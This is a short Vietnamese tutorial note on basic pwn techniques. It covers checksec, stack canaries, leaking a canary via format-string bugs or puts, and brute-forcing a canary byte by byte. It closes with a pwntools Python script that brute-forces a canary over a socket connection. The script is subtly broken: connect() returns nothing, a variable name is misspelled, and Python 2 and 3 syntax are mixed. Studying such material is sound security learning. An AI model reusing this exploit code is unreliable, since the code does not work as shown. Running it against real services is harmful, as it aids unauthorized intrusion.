> Mục đích: Tổng hợp các kĩ thuật pwn cơ bản

# Checksec

> checksec cho ta biết các bảo vệ nào của file được bật, khi nhìn vào checksec ta có thể đoán được các kĩ thuật khai thác nào có thể không sử dụng được điều này rất qua trọng giúp chúng ta tránh mất thời gian và công sức

### Canary

- Hiểu đơn giản là canary tạo một giá trị hex, đẩy vào cuối stack (thường là trên saved rbp).
- Chức năng của nó là chống bof đến saved rip
  Để bypass được canary: có 2 cách chính

##### leak canary

ta có thể sử dụng FMT để leak giá trị canary. (printf hoặc puts)
printf nếu là fmt sẽ có trong file
ở đây ta có thể sử dụng puts để leak canary

##### Brute force Canary

Do em chưa thử cách này nên cũng chỉ dừng lại ở mức cách brute force

- Hoạt động: ta sẽ OW đến giá trị canary và ghi đè canary ta BF, nếu đúng chương trình thực hiện tiếp, nếu không chương trình sẽ lặp lại
- Nhược điểm: thường khá mất nhiều thời gian.

<details> <summary> Example 1 </summary>

```python
from pwn import *

def connect():
    r = remote("localhost", 8788)

def get_bf(base):
    canary = ""
    guess = 0x0
    base += canary

    while len(canary) < 8:
        while guess != 0xff:
            r = connect()

            r.recvuntil("Username: ")
            r.send(base + chr(guess))

            if "SOME OUTPUT" in r.clean():
                print "Guessed correct byte:", format(guess, '02x')
                canary += chr(guess)
                base += chr(guess)
                guess = 0x0
                r.close()
                break
            else:
                guess += 1
                r.close()

    print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
    return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```

</details>
